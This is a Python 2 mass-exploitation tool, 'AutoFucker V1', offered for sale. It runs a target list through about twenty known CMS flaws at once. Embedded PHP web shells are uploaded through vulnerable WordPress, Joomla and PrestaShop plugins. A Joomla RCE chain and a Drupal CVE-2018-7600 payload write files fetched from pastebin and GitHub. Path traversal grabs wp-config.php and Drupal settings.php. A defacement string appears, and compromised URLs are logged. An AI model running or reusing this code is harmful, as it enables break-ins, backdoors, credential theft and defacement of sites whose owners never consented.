# !/usr/bin/python


import requests, os, sys, codecs
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from time import time as timer
import time
from random import sample as rand
from platform import system
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init

init (autoreset=True)

requests.packages.urllib3.disable_warnings (InsecureRequestWarning)

####### Colors	 ######

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

#######################
try:
    with codecs.open (sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read ().splitlines ()
except IOError:
    pass
ooo = list ((ooo))


def banners():
    if system () == 'Linux':
        os.system ('clear')
    if system () == 'Windows':
        os.system ('cls')

        banner = """{}{} \n \n




     _         _        _____           _              __     ___ 
    / \  _   _| |_ ___ |  ___|   _  ___| | _____ _ __  \ \   / / |
   / _ \| | | | __/ _ \| |_ | | | |/ __| |/ / _ \ '__|  \ \ / /| |
  / ___ \ |_| | || (_) |  _|| |_| | (__|   <  __/ |      \ V / | |
 /_/   \_\__,_|\__\___/|_|   \__,_|\___|_|\_\___|_|       \_/  |_|
                                                                  

              Coded By: Raiz0WorM & X-Warn!ng
			  
			  #If you want to buy contact one of us =)
			  
              [+]  https://www.facebook.com/youness.ih.1 [+] 
				[+] https://www.facebook.com/Warning.Siyass [+] 




		\n""".format (fc, sb)

        print banner


shell = """ <?php echo 'Raiz0WorM_Ye'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""

shell_2 = """GIF89a <?php echo 'Raiz0WorM'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" Joomla="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""

payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.php','w+'),file_get_contents('http://pastebin.com/raw/Q1aM9w16')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("http://pastebin.com/raw/Q1aM9w16"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.html','w+'),' Hacked By Dr.Shap7-Nine ');"""

filex = "raiz0.php"

ok = "Attacker.php"

up = "u3p.php"

ez = "tool/tarik.zip"

xo = "xo.php"

up5 = "tool/error.php"

lol = "tool/x.PhP.txtx"

shell_name = str (time.time ())[:-3]
filename = "Raiz0WorM_" + shell_name + ".php"
filenamex = "Raiz0_" + str (shell_name) + ".php.php"


def rce_url(url, user_agent):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
            'x-forwarded-for': user_agent
        }
        cookies = requests.get (url, headers=headers).cookies
        for _ in range (3):
            response = requests.get (url, headers=headers, cookies=cookies)
        return response

    except:
        pass


def php_str_noquotes(data):
    try:

        "Convert string to chr(xx).chr(xx) for use in php"
        encoded = ""
        for char in data:
            encoded += "chr({0}).".format (ord (char))

        return encoded[:-1]

    except:
        pass


def generate_payload(php_payload):
    try:

        php_payload = "eval({0})".format (php_str_noquotes (php_payload))

        terminate = '\xf0\xfd\xfd\xfd';
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format (php_payload)
        exploit_template += r'''s:{0}:"{1}"'''.format (str (len (injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

        return exploit_template

    except:
        pass


def rand_str(len=None):
    if len == None:
        len = 8
    return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))


def toCharCode(string):
    try:
        encoded = ""
        for char in string:
            encoded += "chr({0}).".format (ord (char))
        return encoded[:-1]
    except:
        pass

def php_str_noquotes(data):
    try:

        "Convert string to chr(xx).chr(xx) for use in php"
        encoded = ""
        for char in data:
            encoded += "chr({0}).".format (ord (char))

        return encoded[:-1]

    except:
        pass


def ExploitS(url):
    try:

        filenames = 'Raiz0' + '__' + rand_str (5) + '.php'

        # 2 .   revslider

        revsliderapp = {'action': 'revslider_ajax_action',
                        'client_action': 'update_plugin'}

        revsliderup = {'update_file': (filenames, shell, 'text/html')}

        revslidereq = requests.post (url + '/wp-admin/admin-ajax.php', data=revsliderapp, files=revsliderup)

        revsliderlib = requests.get (url + '/wp-content/plugins/revslider/temp/update_extract/' + filenames)

        if 'Raiz0WorM' in revsliderlib.content:
            print '[{}Target]: {} {}	       ====> {}{} Revslider     {}{} Success upload  '.format (sb, sd, url, fc,
                                                                                                       fc, sb, fg)
            open ('Shells.txt', 'a').write (
                url + '/wp-content/plugins/revslider/temp/update_extract/' + filenames + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} Revslider     {}{} Failed  '.format (sb, sd, url, fc, fc, sb,
                                                                                               fr)

        # 3 . Rev 2

        revslider2 = {'action': 'revslider_ajax_action',
                        'client_action': 'update_plugin'}

        revup = {'update_file': open ('tool/raiz0.zip', 'rb')}

        revreq = requests.post (url + '/wp-admin/admin-ajax.php', data=revslider2, files=revup)

        revgi = requests.get (url + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/vuln.php?c=vuln.php')

        if 'Raiz0WorM' in revgi.content:
            print '[{}Target]: {} {}	       ====> {}{} Revslider Avada     {}{} Success upload  '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write(url + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/vuln.php?c=vuln.php' + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} Revslider Avada     {}{} Failed  '.format (sb, sd, url, fc, fc, sb,
                                                                                               fr)

        # 3 .   Showbiz

        showbizapp = {'action': 'showbiz_ajax_action',
                      'client_action': 'update_plugin'}

        showbizup = {'update_file': (filenames, shell, 'text/html')}

        showbizreq = requests.post (url + '/wp-admin/admin-ajax.php', data=showbizapp, files=showbizup)

        showbizlib = requests.get (url + '/wp-content/plugins/showbiz/temp/update_extract/' + filenames)

        if 'Raiz0WorM' in showbizlib.content:
            print '[{}Target]: {} {}	       ====> {}{} Showbiz     {}{} Success upload  '.format (sb, sd, url, fc,
                                                                                                     fc, sb, fg)
            open ('Shells.txt', 'a').write (
                url + '/wp-content/plugins/revslider/temp/update_extract/' + filenames + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} Showbiz     {}{} Failed  '.format (sb, sd, url, fc, fc, sb,
                                                                                             fr)

        # 6 . XD

        pl = generate_payload ("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/rxr.php','w+'),file_get_contents('https://pastebin.com/raw/KfhBrjRb'));")

        rce_url (url, pl)

        req_rce = requests.get (url + '/rxr.php?rxr')

        if 'RxR HaCkEr_Ye' in req_rce.content:

            print '{}[Target]: {} {}    ====> {}{} com_contact   {}{} Success Upload  '.format (sb, sd, url, fc, fc, sb,
                                                                                        fg)
            open ('shells.txt', 'a').write (url + '/rxr.php?rxr' + '\n')


        else:

            print '{}[Target]: {} {}   ====> {}{}  com_contact  {}{} Failed  '.format (sb, sd, url, fc, fc, sb, fr)


        # 6 . XD

        vuln_url = url + '/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../' + filename

        req_b2j = requests.post (vuln_url, data=shell, timeout=5)

        check_lib = requests.get (url + '/components/' + filename)

        if 'Raiz0WorM_Ye' in check_lib.content:
            print '{}[Target]: {} {}    ====> {}{} CoM_b2j  {}{} Success Upload  '.format (sb, sd, url, fc, fc,
                                                                                           sb, fg)
            open ('Shells.txt', 'a').write (url + '/components/' + filename + '\n')


        else:
            print '{}[Target]: {} {}   ====> {}{}  CoM_b2j  {}{} Failed..:(  '.format (sb, sd, url, fc, fc, sb, fr)

        # 5 . LearnDash

        LearnDashup = {'uploadfiles[]': (filenamex, shell, 'text/html')}

        LearnDashreq = requests.post (url, files=LearnDashup,
                                      data={'post': 'foobar', 'course_id': 'foobar', 'uploadfile': 'foobar'})

        LearnDashlib = requests.get (url + '/wp-content/uploads/assignments/' + filenamex.replace ('.php.php', '.php.'))

        if 'Raiz0WorM_Ye' in LearnDashlib.content:
            print '[{}Target]: {} {}	       ====> {}{} CVE-2018-2608     {}{} Success upload  '.format (sb, sd, url, fc,
                                                                                                       fc, sb, fg)
            open ('Shells.txt', 'a').write (
                url + '/wp-content/uploads/assignments/' + filenamex.replace ('.php.php', '.php.') + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} CVE-2018-2608    {}{} Failed  '.format (sb, sd, url, fc, fc, sb,
                                                                                              fr)

        # 8 . Cherry

        Cherryup = {'file': (filenames, shell, 'text/html')}

        Cherryreq = requests.post (url + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php',
                                   files=Cherryup)

        Cherrylib = requests.get (url + '/wp-content/plugins/cherry-plugin/admin/import-export/' + filenames)

        if 'Raiz0WorM_Ye' in Cherrylib.content:
            print '[{}Target]: {} {}	       ====> {}{} Cherry     {}{} Success upload  '.format (sb, sd, url, fc, fc,
                                                                                                    sb, fg)
            open ('Shells.txt', 'a').write (
                url + '/wp-content/plugins/cherry-plugin/admin/import-export/' + filenames + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} Cherry    {}{} Failed  '.format (sb, sd, url, fc, fc, sb, fr)

        # 9 . dzs

        Adsup = {'file': (xo, shell_2, 'text/html')}

        Adsreq = requests.post (url + '/wp-content/plugins/dzs-videogallery/upload.php', files=Adsup)

        Adsget = requests.get (url + '/wp-content/plugins/dzs-videogallery/upload/xo.php')

        if 'Raiz0WorM' in Adsget.content:
            print '[{}Target]: {} {}	       ====> {}{} videogallery Uploader   {}{} exploiting done  '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write (url + '/wp-content/plugins/dzs-videogallery/upload/xo.php' + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} videogallery Uploader    {}{} Failed  '.format (sb, sd, url, fc, fc, sb,
                                                                                               fr)

        # 9 . ForMCraft

        check_form = requests.get (url + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php')

        if "failed:No file found 2" in check_form.content:
            print '{}[+]: {} {}   ====> {}{}  ForMCraft  {}{} Vuln  '.format (sb, sd, url, fc, fc, sb, fg)

            formup = "v4.php"

            form_up = {'file': (formup, shell, 'text/html')}

            req_form = requests.post (url + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php',
                                      files=form_up)

            req_lib = requests.get (url + '/wp-content/plugins/formcraft//file-upload/server//php/files/v4.php')

            if 'Raiz0WorM_Ye' in req_lib.content:
                print '{}[Target]: {} {}    ====> {}{} ForMCraft  {}{} eXploiting Done  '.format (sb, sd, url, fc, fc,
                                                                                                  sb, fg)
                open ('Shells.txt', 'a').write (
                    url + '/wp-content/plugins/formcraft//file-upload/server//php/files/v4.php' + '\n')
            else:
                print '[{}Target]: {} {}	       ====> {}{} ForMCraft    {}{} Failed  '.format (sb, sd, url, fc, fc,
                                                                                                  sb,
                                                                                                  fr)
        else:

            print '{}[Target]: {} {}   ====> {}{}  ForMCraft   {}{} Failed  '.format (sb, sd, url, fc, fc, sb,
                                                                                      fr)

        # 11 . dzs-videogallery

        Vidsup = {'file': (filenames, shell, 'text/html')}

        Vidsreq = requests.post (url + '/wp-admin/admin.php?page=levoslideshow_manage', files=Vidsup)

        Vidslib = requests.get (url + '/wp-content/uploads/levoslideshow/42_uploadfolder/big/' + filenames)

        if 'Raiz0WorM_Ye' in Vidslib.content:

            print '[{}Target]: {} {}	       ====> {}{} LevoSLideShow    {}{} Success Upload '.format (sb, sd, url,
                                                                                                         fc, fc, sb,
                                                                                                         fg)

            open ('Shells.txt', 'a').write (
                url + '/wp-content/uploads/levoslideshow/42_uploadfolder/big/' + filenames + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} LevoSLideShow   {}{} Failed  '.format (sb, sd, url, fc, fc,
                                                                                                 sb, fr)


        # 14 . pur4vision

        files = {'qqfile': (up5, open (up5, 'rb'), 'multipart/form-data')}

        oi = requests.post (url + '/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php', files=files, timeout=3)

        re2 = requests.get (url + '/error.php')

        if 'Tyrag' in re2.content:
            print '[{}Target]: {} {}	       ====> {}{} purevision    {}{} Success Upload '.format (sb, sd, url, fc, fc,
                                                                                                  sb, fg)
            open('Shells.txt', 'a').write(url + '/error.php' + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} purevision    {}{} Failed '.format (sb, sd, url, fc, fc, sb, fr)

        # 16 . Rev Config

        ok = requests.get (url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', timeout=3)

        if 'DB_USER' in ok.content:
            print '[{}FrameWork]: {} {}	       ====> {}{} Config Grab    {}{} Success Grab '.format (sb, sd, url, fc, fc,
                                                                                                  sb, fg)
            open ('Config.txt', 'a').write(url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php' + '\n')
        else:
            print '[{}FrameWorK]: {} {}	       ====> {}{} Config Grab    {}{} Failed '.format (sb, sd, url, fc, fc, sb, fr)

        # 17 . OK

        basbe = {'value': './'}

        sabo = {'uploadfile': (up, shell_2, 'text/html')}

        sabo1 = requests.post (url + '/wp-content/themes/clockstone/theme/functions/uploadbg.php', files=sabo , data=basbe, timeout=3)

        sabog = requests.get (url + '/wp-content/themes/clockstone/theme/functions/u3p.php')

        if 'Raiz0WorM' in sabog.content:
            print '[{}WordPreSS]: {} {}	       ====> {}{} clockstone themes    {}{} eXploiting Done '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write (url + '/wp-content/themes/clockstone/theme/functions/u3p.php' + '\n')
        else:
            print '[{}WordPreSS]: {} {}	       ====> {}{} clockstone themes     {}{} Failed '.format (sb, sd, url, fc, fc, sb, fr)

        # 18 . XD

        thass = {'uploadfile': (ok, shell_2, 'text/html')}

        oki = requests.post (url + '/modules/fieldvmegamenu/ajax/upload.php', files=thass)

        ok2 = requests.get (url + '/modules/fieldvmegamenu/uploads/Attacker.php')

        if 'Raiz0WorM' in ok2.content:
            print '[{}WordPreSS]: {} {}	       ====> {}{}  fieldvmegamenu  {}{} eXploiting Done '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write (url + '/modules/fieldvmegamenu/uploads/Attacker.php' + '\n')
        else:
            print '[{}WordPreSS]: {} {}	       ====> {}{} fieldvmegamenu     {}{} Failed '.format (sb, sd, url, fc, fc, sb, fr)

        # 16 . TEVOLUTION

        Tevoup = {'file': (filenames, shell, 'text/html')}

        Tevoreq = requests.post (url + '/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php', files=Tevoup)

        Tevorlib = requests.get (url + '/wp-content/themes/Directory/images/tmp/' + filenames)

        if 'Raiz0WorM_Ye' in Tevorlib.content:
            print '[{}Target]: {} {}	       ====> {}{} Tevolution     {}{} Success upload  '.format (sb, sd, url, fc,
                                                                                                        fc, sb, fg)
            open ('Shells.txt', 'a').write (url + '/wp-content/themes/Directory/images/tmp/' + filenames + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} Tevolution    {}{} Failed  '.format (sb, sd, url, fc, fc, sb,
                                                                                               fr)

        # 13 . OK

        uploader = {'file': (up, shell_2, 'text/html')}

        oki = requests.post (url + '/modules/mod_simplefileuploadv1.3/elements/udd.php', files=uploader)

        ok2 = requests.get (url + '/modules/mod_simplefileuploadv1.3/elements/u3p.php')

        if 'Raiz0WorM' in ok2.content:
            print '[{}WordPreSS]: {} {}	       ====> {}{}  mod_simplefileupload  {}{} eXploiting Done '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write (url + '/modules/mod_simplefileuploadv1.3/elements/u3p.php' + '\n')
        else:
            print '[{}WordPreSS]: {} {}	       ====> {}{}  mod_simplefileupload     {}{} Failed '.format (sb, sd, url, fc, fc, sb, fr)

        # 16 . XD

        Reflexup = {'qqfile': (filenames, shell_2, 'text/html')}

        Reflexreq = requests.post (
            url + '/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=01', files=Reflexup)

        Reflexlib = requests.get (url + '/wp-content/uploads/2018/01/' + filenames)

        if 'Raiz0WorM' in Reflexlib.content:
            print '[{}Target]: {} {}	       ====> {}{} Reflex Gallery     {}{} Success upload  '.format (sb, sd, url,
                                                                                                            fc, fc, sb,
                                                                                                            fg)
            open ('Shells.txt', 'a').write (url + '/wp-content/uploads/2018/01/' + filenames + '\n')
        else:
            print '[{}Target]: {} {}	       ====> {}{} Reflex Gallery     {}{} Failed  '.format (sb, sd, url, fc, fc,
                                                                                                    sb, fr)

        # 17 . x

        fileto = {'update': (ok, shell_2, 'text/html')}

        dickens = requests.post (url + '/assets/ckeditor/kcfinder/upload.php', files=fileto)

        dickno = requests.get (url + '/assets/ckeditor/kcfinder/upload/files/Attacker.php')

        if 'Raiz0WorM' in dickno.content:
            print '[{}WordPreSS]: {} {}	       ====> {}{}  KcFinder {}{} eXploiting Done '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write (url + '/assets/ckeditor/kcfinder/upload/files/Attacker.php' + '\n' )
        else:
            print '[{}WordPreSS]: {} {}	       ====> {}{}  KcFinder    {}{} Failed '.format (sb, sd, url, fc, fc, sb, fr)

        # 1 . XD

        izzy = {'file': (ok, shell_2, 'text/html')}

        vulni = url + '/modules/megamenu/uploadify/uploadify.php?folder=modules/megamenu/uploadify/'

        riop = requests.post (vulni, files=izzy)

        gitme = requests.get (url + '/modules/Attacker.php')

        if 'Raiz0WorM' in gitme.content:
            print '[{}WordPreSS]: {} {}	       ====> {}{}  MeGaMenu {}{} eXploiting Done '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write(url + '/modules/Attacker.php' + '\n')
        else:
            print '[{}WordPreSS]: {} {}	       ====> {}{}  MeGaMenu    {}{} Failed '.format (sb, sd, url, fc, fc, sb, fr)

        # 13 . 5

        oo = {'Filedata': (filex, shell_2, 'text/html')}

        ii = requests.post (url + '/modules/namemodule/uploadimage.php', files=oo)

        io = requests.get (url + '/modules/homepageadvertise2/slides/raiz0.php')

        if 'Raiz0WorM' in gitme.content:
            print '[{}PretaShop]: {} {}	       ====> {}{}  CVE-2018 {}{} eXploiting Done '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write(url + '/modules/homepageadvertise2/slides/raiz0.php' + '\n')
        else:
            print '[{}PretaShop]: {} {}	       ====> {}{}  CVE-2018   {}{} Failed '.format (sb, sd, url, fc, fc, sb, fr)

        # 18 . 3

        vuln = url + '/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload' + filex

        r = requests.post (vuln, data=shell_2)

        r2 = requests.get (url + '/media/raiz0.php')

        if 'Raiz0WorM' in r2.content:
            print '{}[Joomla]: {} {}   ====> {}{}  Com_FabriK {}{} Success Upload  '.format (sb, sd, url, fc, fc, sb, fg)
            open ('Shells.txt', 'a').write (url + '/media/' + str (filename) + '\n')
        else:
            print '{}[Joomla]: {} {}   ====> {}{}  Com_FabriK {}{} Failed  '.format (sb, sd, url, fc, fc, sb, fr)


        # 23 . 5 4

        filename1 = "raiz0worm.php3.g"

        com_jd_up = {'file_upload': (filename1, shell_2, 'text/html'),
                     'pic_upload': (filename1, shell_2, 'text/html')}

        com_jd_dat = {'name': 'yc-waif', 'mail': 'rusltpaypal@gmail.com', 'catlist': '1', 'filetitle': "lolz",
                      'description': "<p>zot</p>", '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1,
                      'senden': "Send file",
                      'description': "<p>newsking</p>", 'option': "com_jdownloads", 'view': "upload"}

        req_jd = requests.post (url + '/index.php?option=com_jdownloads&Itemid=0&view=upload', data=com_jd_dat, files=com_jd_up)

        shell_jd = requests.get (url + '/images/jdownloads/screenshots/raiz0worm.php3.g?raiz0')

        if 'Raiz0WorM_Ye' in shell_jd.content:

            print '{}[Target]: {} {}    ====> {}{} com_jdownloads   {}{} Success Upload  '.format (sb, sd, url, fc,
                                                                                                   fc, sb, fg)
            open ('shells.txt', 'a').write (url + '/images/jdownloads/screenshots/raiz0worm.php3.g?raiz0' + '\n')

        else:
            print '{}[Target]: {} {}   ====> {}{}  com_jdownloads  {}{} Failed..:(  '.format (sb, sd, url, fc, fc,
                                                                                              sb,
                                                                                              fr)

        # 18 . DRUPAL MOTHERFUCKER

        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup',
                   'mail[#markup]': 'wget https://raw.githubusercontent.com/izoking/2/master/u.php && curl https://raw.githubusercontent.com/izoking/2/master/u.php'}
        headers = {'User-Agent': 'Mozilla 5.0'}
        r = requests.post (
            url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            data=payload, verify=False, headers=headers)
        if 'izocin' in requests.get (url + '/u.php', headers=headers).text:
            print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V8    {}{} Success upload  '.format (sb, sd,
                                                                                                                 url,
                                                                                                                 fc, fc,
                                                                                                                 sb, fg)
            open ('Shells.txt', 'a').write (url + '/u.php' + '\n')
            sys.exit ()
        else:
            print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V8    {}{} Failed  '.format (sb, sd, url, fc, fc, sb, fr)

        # 19 . DZEAZ


        ddrevlib = requests.get (url + "/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php")

        if 'drupal_hash_salt' in ddrevlib.content:
            print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-9205     {}{} Success  '.format (sb, sd, url, fc, fc,
                                                                                                    sb, fg)
            open ('Config.txt', 'a').write (
                url + '/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php' + '\n')
        else:
            print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-9205     {}{} Failed  '.format (sb, sd, url, fc, fc,
                                                                                                   sb, fr)






    except:
        pass


banners ()

def Main():
    try:

        start = timer ()
        ThreadPool = Pool (50)
        Threads = ThreadPool.map (ExploitS, ooo)
        print('Time: ' + str (timer () - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main ()
